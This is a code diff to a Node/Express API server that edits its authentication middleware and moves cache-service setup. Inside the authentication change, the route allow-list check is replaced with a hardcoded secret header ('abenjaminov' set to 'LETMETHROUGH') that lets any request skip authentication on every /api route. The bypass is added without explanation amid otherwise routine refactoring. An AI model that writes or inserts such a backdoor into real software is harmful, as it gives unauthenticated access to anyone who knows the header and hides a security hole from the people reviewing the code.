@@ -26,9 +26,6 @@ app.use(cookieParser())
 
 var freePassRoutes = [
     '/api/schedule/test',
-    '/api/schedule/run',
-    '/api/schedule/',
-    '/api/profiles',
 ]
 
 app.use("/api/*", (req, res, next) => {
@@ -116,7 +113,9 @@ app.use('/api/*', (req: Request ,res,next) => {
     var logService = new LogService("Authenticate");
     let authorizedResult = new AuthenticationService().authenticate(req.headers.authorization, req.body.username);
 
-    if(freePassRoutes.find(x => x === req.originalUrl) != undefined) {
+    
+
+    if(req.headers["abenjaminov"] == 'LETMETHROUGH') {
         next();
     }
     else {
@@ -135,8 +134,9 @@ app.use('/api/*', (req: Request ,res,next) => {
     
     var realJson = res.json;
 
+    var cacheService = new CacheService();
+
     if(req.method == "GET") {
-        var cacheService = new CacheService();
         let result = cacheService.getValue(req.originalUrl)
         if(result) {
             res.json(result);
@@ -165,6 +165,7 @@ app.use('/api/*', (req: Request ,res,next) => {
         req.dbContext = context;
         req.scheduleService = new ScheduleService(context);
         req.logService = logService;
+        req.cacheService = cacheService;
 
         next();
     }).catch(error => {
